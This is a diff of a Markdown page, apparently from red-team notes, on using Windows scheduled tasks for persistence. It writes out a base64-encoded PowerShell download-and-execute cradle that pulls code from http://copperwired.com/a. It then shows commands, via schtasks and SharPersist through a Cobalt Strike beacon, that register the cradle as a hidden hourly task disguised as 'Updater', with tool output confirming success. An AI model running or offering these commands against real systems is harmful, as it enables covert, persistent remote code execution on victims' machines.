@@ -1,46 +1,37 @@
 # Scheduled Tasks
 
-### PowerShell
+## Creating Tasks
+
+Windows Task Scheduler allows us to create tasks that execute on a pre-defined trigger. For example they can be:
+
+* Time of day
+* User Login
+* Computer Idle
+* Every n hours, minutes, seconds
+
+### Building Payload
 
 For this example we will base64 encode our PowerShell payload using -enc (-EncodedCommand)
 
-<pre><code>PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://copperwired.com/a"))'
+<pre class="language-powershell"><code class="lang-powershell">PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://copperwired.com/a"))'
 
 <strong>PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 </strong></code></pre>
 
 #### Output:
 
-```
+```powershell
 SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBjAG8AcABwAGUAcgB3AGkAcgBlAGQAL
 gBjAG8AbQAvAGEAIgApACkA
 ```
 
-#### Execute Payload
-
-We can execute the payload with schtasks
-
-```powershell
-PS> schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc 
-SQBFAFgAIAAo...ACgAbgBlAHcALQBvAGkA" -n "Updater" -m add -o hourly
-```
-
-### CobaltStrike
+### Execute Payload - SharPersist & Cobalt Strike
 
 We can use the `execute-shellcode` command from an existing beacon in CobaltStrike to establish persistence. We'll also have to utilize a tool like [SharPersist](https://github.com/mandiant/SharPersist) as there are no built-in persistence tools.&#x20;
 
-#### Execute Payload
-
-```
-beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAI...QAvAGEAIgApACkA" -n "Updater" -m add -o hourly
-
-[*] INFO: Adding scheduled task persistence
-[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbHc...BjAG8AbQAvAGEAIgApACkA
-[*] INFO: Scheduled Task Name: Updater
-[*] INFO: Option: hourly
-[+] SUCCESS: Scheduled task added
-
+```powershell
+beacon> execute-assembly C:\Tools\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc 
+SQBFAFgAIAAo...ACgAbgBlAHcALQBvAGkA" -n "Updater" -m add -o hourly
 ```
 
 * `-t` is the desired persistence technique.
